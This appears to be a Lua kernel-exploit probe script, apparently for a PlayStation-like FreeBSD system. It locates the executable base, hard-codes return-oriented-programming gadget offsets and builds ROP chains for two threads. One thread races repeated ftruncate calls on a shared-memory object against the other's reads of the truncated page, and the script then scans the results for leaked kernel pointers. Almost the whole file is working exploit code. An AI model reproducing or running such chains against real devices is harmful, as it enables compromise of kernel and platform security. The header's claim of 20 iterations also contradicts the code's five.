-- CRASH_CLASS: HIGH
-- PROBE 1100b: SHM ftruncate race (small) — 20 iterations to verify mechanism
--
-- 1100a crashed during chain setup (48KB chain too slow to write).
-- This version uses 20 iterations to confirm: threads launch, ftruncate races,
-- and Thread B behavior when hitting a truncated page.

print("=== PROBE 1100b: SHM FTRUNCATE RACE (SMALL) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Get eboot base
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), info_buf) end)
local eboot_lo = safe_rd(info_buf + 0x108)
local eboot_hi = safe_rd(info_buf + 0x10C)
local eboot_base = uint64(string.format("0x%X%08X", eboot_hi or 0, eboot_lo or 0))

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local syscall_stub = uint64(fn_str)

print(string.format("[0] eboot=%s syscall_stub=%s", tostring(eboot_base), tostring(syscall_stub)))

-- Gadgets
local pop_rax_ret = eboot_base + uint64(0x992)
local pop_rdi_ret = eboot_base + uint64(0xC9DFE)
local pop_rsi_ret = eboot_base + uint64(0xD77D)
local pop_rdx_ret = eboot_base + uint64(0x3B02D7)
local mov_rdi_rax_ret = eboot_base + uint64(0x92C67)
local mov_rax_deref_rax = eboot_base + uint64(0x1EEBB)

local sc_pid = make_syscall(20)
local pid = to_num(sc_pid())
print(string.format("[0] pid=%d", pid))

-- Create SHM object
local LARGE = 0x40000   -- 256KB = 16 pages
local SMALL = 0x4000    -- 16KB = 1 page
local sc_shm = make_syscall(482)
local shm_fd = to_num(sc_shm(uint64(1), uint64(0x602), uint64(0x1FF)))
print(string.format("[1] shm fd=%d", shm_fd))
if shm_fd < 0 then print("[!] FAILED") return end

local sc_ftrunc = make_syscall(480)
to_num(sc_ftrunc(uint64(shm_fd), uint64(LARGE)))

local sc_mmap = make_syscall(477)
local map = sc_mmap(uint64(0), uint64(LARGE), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
print(string.format("[2] map=%s", tostring(map)))

-- Write sentinels
for p = 0, 15 do
    safe_wd(map + uint64(p * 0x4000), 0xAA000000 + p)
end

-- Shared state for results
local shared = memory.alloc(0x1000)
for i = 0, 255 do safe_wd(shared + i*4, 0) end

-- Helper to build chain
local function build_chain(entries)
    local STACK_SIZE = 0x200000
    local stack = memory.alloc(STACK_SIZE)
    local rsp_top = to_num(stack) + STACK_SIZE
    rsp_top = math.floor(rsp_top / 16) * 16 - 8

    -- Write chain at top of stack
    local base = uint64(rsp_top)
    for i, val in ipairs(entries) do
        safe_wq(base + uint64((i-1) * 8), val)
    end

    -- Build fake TCB
    local tcb = memory.alloc(0x1000)
    safe_wq(tcb, tcb)
    local fsb = memory.alloc(8)
    safe_wq(fsb, tcb)

    return stack, uint64(STACK_SIZE), fsb
end

-- Build a syscall sequence: [sysnum, pop_rdi_ret, arg1, pop_rsi_ret, arg2, syscall_stub, pop_rax_ret]
local function sc_seq(sysnum, arg1, arg2)
    return {sysnum, pop_rdi_ret, arg1, pop_rsi_ret, arg2, syscall_stub, pop_rax_ret}
end

-- Flatten table of tables
local function flatten(...)
    local r = {}
    for _, t in ipairs({...}) do
        for _, v in ipairs(t) do r[#r+1] = v end
    end
    return r
end

local ITERS = 5

-- Thread A chain: sysarch then loop ftruncate(small)/ftruncate(large)
print("[3] building chain A...")
local chain_a = {}
-- sysarch(165, SET_FSBASE=129, &fsb)
-- Will fill fsb address after build_chain allocates it

-- Build chain A entries
local function make_chain_a(fsb_addr)
    local c = {}
    -- sysarch(165): rax=165, rdi=129, rsi=fsb
    for _, v in ipairs({uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, uint64(to_num(fsb_addr)), syscall_stub, pop_rax_ret}) do
        c[#c+1] = v
    end

    for i = 1, ITERS do
        -- ftruncate(shm_fd, SMALL)
        for _, v in ipairs({uint64(480), pop_rdi_ret, uint64(shm_fd), pop_rsi_ret, uint64(SMALL), syscall_stub, pop_rax_ret}) do
            c[#c+1] = v
        end
        -- ftruncate(shm_fd, LARGE)
        for _, v in ipairs({uint64(480), pop_rdi_ret, uint64(shm_fd), pop_rsi_ret, uint64(LARGE), syscall_stub, pop_rax_ret}) do
            c[#c+1] = v
        end
    end

    -- Write done marker
    c[#c+1] = uint64(0xDEAD1100)  -- rax
    c[#c+1] = pop_rdi_ret
    c[#c+1] = uint64(to_num(shared + 0x00))
    c[#c+1] = mov_rdi_rax_ret
    -- thr_exit(431)
    c[#c+1] = pop_rax_ret
    c[#c+1] = uint64(431)
    c[#c+1] = pop_rdi_ret
    c[#c+1] = uint64(0)
    c[#c+1] = syscall_stub

    return c
end

-- Thread B chain: sysarch then loop read from boundary page
local function make_chain_b(fsb_addr)
    local c = {}
    -- sysarch
    for _, v in ipairs({uint64(165), pop_rdi_ret, uint64(129), pop_rsi_ret, uint64(to_num(fsb_addr)), syscall_stub, pop_rax_ret}) do
        c[#c+1] = v
    end

    -- Target: page 1 (offset 0x4000) — gone when ftruncated to SMALL
    local target = map + uint64(0x4000)

    for i = 1, ITERS do
        -- Read *target into rax, store to shared
        c[#c+1] = uint64(to_num(target))  -- rax = target addr
        c[#c+1] = mov_rax_deref_rax        -- rax = *target (may fault!)
        c[#c+1] = pop_rdi_ret
        c[#c+1] = uint64(to_num(shared + 0x100 + ((i-1) % 32) * 8))
        c[#c+1] = mov_rdi_rax_ret
        c[#c+1] = pop_rax_ret
    end

    -- Done marker
    c[#c+1] = uint64(0xDEAD1101)
    c[#c+1] = pop_rdi_ret
    c[#c+1] = uint64(to_num(shared + 0x08))
    c[#c+1] = mov_rdi_rax_ret
    -- thr_exit
    c[#c+1] = pop_rax_ret
    c[#c+1] = uint64(431)
    c[#c+1] = pop_rdi_ret
    c[#c+1] = uint64(0)
    c[#c+1] = syscall_stub

    return c
end

-- Allocate stacks first, get fsb addresses, then write chains
local STACK_SIZE = 0x10000  -- 64KB (chain is <1KB)
local stack_a = memory.alloc(STACK_SIZE)
local stack_b = memory.alloc(STACK_SIZE)
print(string.format("[3b] stacks: A=%s B=%s", tostring(stack_a), tostring(stack_b)))

local tcb_a = memory.alloc(0x1000)
safe_wq(tcb_a, tcb_a)
local fsb_a = memory.alloc(8)
safe_wq(fsb_a, tcb_a)

local tcb_b = memory.alloc(0x1000)
safe_wq(tcb_b, tcb_b)
local fsb_b = memory.alloc(8)
safe_wq(fsb_b, tcb_b)

local chain_a_data = make_chain_a(fsb_a)
local chain_b_data = make_chain_b(fsb_b)
print(string.format("[3] chain A: %d entries (%d bytes)", #chain_a_data, #chain_a_data * 8))
print(string.format("[3] chain B: %d entries (%d bytes)", #chain_b_data, #chain_b_data * 8))

-- Write chains to stack tops
local rsp_a = to_num(stack_a) + STACK_SIZE
rsp_a = math.floor(rsp_a / 16) * 16 - 8
local rsp_b = to_num(stack_b) + STACK_SIZE
rsp_b = math.floor(rsp_b / 16) * 16 - 8

local rsp_a_u = uint64(string.format("0x%X", rsp_a))
for i, val in ipairs(chain_a_data) do
    safe_wq(rsp_a_u + uint64((i-1) * 8), val)
end
local rsp_b_u = uint64(string.format("0x%X", rsp_b))
for i, val in ipairs(chain_b_data) do
    safe_wq(rsp_b_u + uint64((i-1) * 8), val)
end
print("[4] chains written")

-- Build thr_param structs (matching 56l pattern exactly)
local param_a = memory.alloc(0x40)
local param_b = memory.alloc(0x40)
local tid_a_ptr = memory.alloc(8)
local tid_b_ptr = memory.alloc(8)
safe_wq(tid_a_ptr, uint64(0))
safe_wq(tid_b_ptr, uint64(0))

local na = to_num(param_a)
local nb = to_num(param_b)
for i = 0, 0x3C, 4 do safe_wd(uint64(na + i), 0) end
for i = 0, 0x3C, 4 do safe_wd(uint64(nb + i), 0) end

safe_wq(param_a, pop_rax_ret)
safe_wq(uint64(na + 0x08), uint64(0))
safe_wq(uint64(na + 0x10), stack_a)
safe_wq(uint64(na + 0x18), uint64(STACK_SIZE))
safe_wq(uint64(na + 0x30), uint64(to_num(tid_a_ptr)))

safe_wq(param_b, pop_rax_ret)
safe_wq(uint64(nb + 0x08), uint64(0))
safe_wq(uint64(nb + 0x10), stack_b)
safe_wq(uint64(nb + 0x18), uint64(STACK_SIZE))
safe_wq(uint64(nb + 0x30), uint64(to_num(tid_b_ptr)))

print("[5] thr_params ready")

-- Launch thread A first (ftruncate racer)
local sc_thr = make_syscall(455)
local ok_a, ret_a = pcall(function()
    return sc_thr(uint64(na), uint64(0x38))
end)
print(string.format("[6] thread A: ok=%s ret=%s", tostring(ok_a), tostring(ret_a and to_num(ret_a) or "nil")))

-- Small busy-wait for A to start
local x = 0; for k = 1, 10000 do x = x + k end

-- Launch thread B (page reader)
local ok_b, ret_b = pcall(function()
    return sc_thr(uint64(nb), uint64(0x38))
end)
print(string.format("[6] thread B: ok=%s ret=%s", tostring(ok_b), tostring(ret_b and to_num(ret_b) or "nil")))

local tid_a = safe_rd(tid_a_ptr)
local tid_b = safe_rd(tid_b_ptr)
print(string.format("[6] thread B: ret=%d tid=%d", ret_b, tid_b or -1))

-- Wait for completion
print("[7] waiting...")
local found_a = false
local found_b = false
for wait = 1, 5000 do
    local da = safe_rd(shared + 0x00)
    local db = safe_rd(shared + 0x08)
    if not found_a and da == 0xDEAD1100 then
        found_a = true
        print(string.format("[7] A done at iter %d", wait))
    end
    if not found_b and db == 0xDEAD1101 then
        found_b = true
        print(string.format("[7] B done at iter %d", wait))
    end
    if found_a and found_b then break end
end

if not found_a then print("[7] A: timeout (still running or crashed)") end
if not found_b then
    print("[7] B: timeout -- likely FAULTED on truncated page (race window hit!)")
end

-- Scan results
print("")
print("[8] scanning shared buffer...")
local kptr_count = 0
local nonzero_count = 0
for i = 0, 31 do
    local val = safe_rq(shared + 0x100 + uint64(i * 8))
    if val then
        local h, l = get_hi_lo(val)
        if h ~= 0 or l ~= 0 then
            nonzero_count = nonzero_count + 1
            if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print(string.format("  [KPTR!] slot %d: 0x%08X%08X", i, h, l))
            elseif nonzero_count <= 5 then
                print(string.format("  slot %d: 0x%08X%08X", i, h, l))
            end
        end
    end
end
print(string.format("[8] nonzero=%d kptrs=%d", nonzero_count, kptr_count))

-- Check mapped region for stale data
print("[9] checking map region...")
for p = 0, 15 do
    local val = safe_rd(map + uint64(p * 0x4000))
    local expected = 0xAA000000 + p
    if val ~= expected then
        print(string.format("  page %d: got 0x%08X expected 0x%08X", p, val or 0, expected))
    end
end

local alive = to_num(sc_pid())
print(string.format("[10] alive pid=%d", alive))
print("")
print("=== PROBE 1100b COMPLETE ===")
